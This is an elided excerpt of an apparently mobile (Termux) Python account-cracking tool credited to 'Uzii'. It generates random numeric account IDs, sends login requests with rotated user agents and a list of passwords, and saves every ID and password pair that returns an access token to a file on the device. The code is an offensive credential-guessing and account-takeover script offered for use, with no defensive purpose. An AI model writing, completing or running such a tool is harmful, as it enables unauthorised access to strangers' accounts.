...
print("\033[1;32m | $$  | $$  /$$__/  | $$| $$   ")
print("\033[1;32m |  $$$$$$/ /$$$$$$$$| $$| $$   ")
print("\033[1;32m  \______/ |________/|__/|__/   ")
                            
                            
                            
   
        print("\033[1;37m------------------------------------------------")
        print("\033[1;33m[+]\033[1;35mAUTHOR  : Uzii")
    ...
    def oldClone(self,series):
        ...
        for a in range(limit):
            Uzii = "".join(random.choice(string.digits) for _ in range(self.uG))
            self.gen.append(Uzii)
...
max = random.choice(ua_list)
    ...
    def CloneOld(self,ids,passlist):
        global loop,oks,cps
        sys.stdout.write(f"\r\r\x1b[m [Uzii-XD] {self.loop}|OK:{len(self.oks)}")
        sys.stdout.flush()
        try:
            for pas in passlist:
                data = {
                ...
                if "access_token" in response:
                    print(f"\r\r\x1b[38;5;46mUzii-OK • {ids} • {pas}")
                    open("/sdcard/Uzii-OLD-OK.txt","a").write(ids+"|"+pas+"\n")
                    self.oks.append(ids)
                    break
